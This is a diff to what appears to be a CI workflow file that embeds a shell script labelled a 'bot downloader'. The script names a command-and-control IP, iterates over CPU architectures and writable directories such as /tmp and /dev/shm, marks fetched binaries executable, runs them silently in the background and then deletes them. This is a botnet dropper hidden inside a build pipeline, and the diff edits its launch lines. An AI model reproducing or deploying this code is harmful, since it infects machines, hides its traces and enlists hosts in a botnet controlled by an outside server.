@@ -21,7 +21,7 @@ jobs:
         #!/bin/sh
         
         PATHS="/tmp /var/run /dev/shm /mnt /root /"
-        ARCHS="mips mipsel x86 armv7l armv6l armv5l i686 ppc64"
+        ARCHS="x86 i686 armv7l armv6l armv5l mips mipsel ppc64"
         CNC_IP="16.171.16.1"
         
         echo "[DEBUG] Starting bot downloader..."
@@ -56,8 +56,8 @@ jobs:
                     echo "[DEBUG] File type: $(file "$b" | cut -d: -f2)"
                     echo "[DEBUG] Making executable..."
                     chmod +x "$b" 2>/dev/null
-                    echo "[DEBUG] Running binary: ./$b bot.payload"
-                    "./$b" bot.payload >/dev/null 2>&1 &
+                    echo "[DEBUG] Running binary: ./$b"
+                    "./$b" >/dev/null 2>&1 &
                     echo "[DEBUG] ✅ Binary $a started in background (PID: $!)"
                     rm -f "$b" 2>/dev/null
                     echo "[DEBUG] Cleaned up $b"
